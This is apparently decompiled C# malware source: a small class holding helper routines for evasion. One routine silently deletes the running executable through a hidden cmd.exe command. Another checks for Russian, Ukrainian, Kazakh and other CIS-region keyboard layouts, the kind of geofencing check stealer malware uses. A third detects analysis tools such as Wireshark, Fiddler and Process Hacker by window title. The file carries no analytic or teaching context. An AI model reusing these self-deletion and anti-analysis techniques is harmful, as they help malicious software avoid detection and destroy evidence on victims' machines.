using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Windows.Forms;

namespace killer
{
	// Token: 0x02000011 RID: 17
	internal class killerr
	{
		// Token: 0x0600002C RID: 44 RVA: 0x00004EA4 File Offset: 0x000030A4
		public static void SelfDel()
		{
			try
			{
				Process.Start(new ProcessStartInfo
				{
					Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name + "\"",
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true,
					FileName = "cmd.exe"
				});
			}
			catch
			{
			}
		}

		// Token: 0x0600002D RID: 45 RVA: 0x00004F28 File Offset: 0x00003128
		public static bool CIS()
		{
			bool result;
			try
			{
				InputLanguageCollection installedInputLanguages = InputLanguage.InstalledInputLanguages;
				string[] array = new string[]
				{
					"Kazakh",
					"Russian",
					"Belarusian",
					"Ukrainian",
					"Kyrgyz",
					"Uzbek",
					"Georgian",
					"Azerbaijani",
					"Tajik",
					"Armenian",
					"Turkmen"
				};
				foreach (object obj in installedInputLanguages)
				{
					foreach (string value in array)
					{
						bool flag = ((InputLanguage)obj).Culture.EnglishName.Contains(value);
						if (flag)
						{
							return true;
						}
					}
				}
				result = false;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x0600002E RID: 46 RVA: 0x00005040 File Offset: 0x00003240
		public static bool antirevers3()
		{
			try
			{
				string[] array = new string[]
				{
					"fiddler",
					"wpe pro",
					"wireshark",
					"http analyzer",
					"charles",
					"task manager",
					"process hacker"
				};
				Process[] processes = Process.GetProcesses();
				foreach (Process process in processes)
				{
					foreach (string value in array)
					{
						bool flag = process.MainWindowTitle.ToLower().Contains(value);
						if (flag)
						{
							return true;
						}
					}
				}
			}
			catch
			{
				return false;
			}
			return false;
		}
	}
}
